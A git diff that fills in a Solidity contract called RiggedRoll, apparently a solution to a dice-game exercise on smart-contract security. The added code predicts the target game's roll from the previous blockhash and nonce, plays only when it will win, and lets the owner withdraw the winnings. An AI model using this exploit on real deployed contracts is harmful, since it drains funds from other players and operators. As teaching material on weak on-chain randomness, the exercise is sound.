@@ -10,18 +10,20 @@ contract RiggedRoll is Ownable {
     /// Errors //////
     /////////////////
 
-    // Errors go here...
+    error NotEnoughETH(uint256 required, uint256 available);
+    error NotWinningRoll(uint256 roll);
+    error InsufficientBalance(uint256 requested, uint256 available);
 
     //////////////////////
     /// State Variables //
     //////////////////////
-    
+
     DiceGame public diceGame;
 
     ///////////////////
     /// Constructor ///
     ///////////////////
-    
+
     constructor(address payable diceGameAddress) Ownable(msg.sender) {
         diceGame = DiceGame(diceGameAddress);
     }
@@ -30,5 +32,22 @@ contract RiggedRoll is Ownable {
     /// Functions /////
     ///////////////////
 
-    // Functions go here...
+    receive() external payable {}
+
+    function riggedRoll() external {
+        uint256 required = 0.002 ether;
+        uint256 available = address(this).balance;
+        if (available < required) revert NotEnoughETH(required, available);
+        bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), address(diceGame), diceGame.nonce()));
+        uint256 roll = uint256(hash) % 16;
+        if (roll > 5) revert NotWinningRoll(roll);
+        diceGame.rollTheDice{ value: required }();
+    }
+
+    function withdraw(address recipient, uint256 amount) external onlyOwner {
+        uint256 available = address(this).balance;
+        if (amount > available) revert InsufficientBalance(amount, available);
+        (bool success, ) = payable(recipient).call{ value: amount }("");
+        require(success, "Withdraw failed");
+    }
 }
